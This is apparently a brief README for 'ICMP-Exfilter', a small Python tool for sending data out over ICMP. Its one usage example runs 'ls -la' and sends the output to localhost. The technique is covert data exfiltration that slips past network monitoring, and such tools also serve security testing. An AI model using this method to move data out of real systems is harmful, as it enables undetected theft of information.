ICMP-Exfilter
=============

A rudimental ICMP exfilter.

Example
-------
Launch a Python 3.x interpreter.

    $ python3
    >>> from icmp_exfilter import ICMPExfilter
    >>> i = ICMPExfilter(["ls", "-la"])
    >>> i.send_to("127.0.0.1")

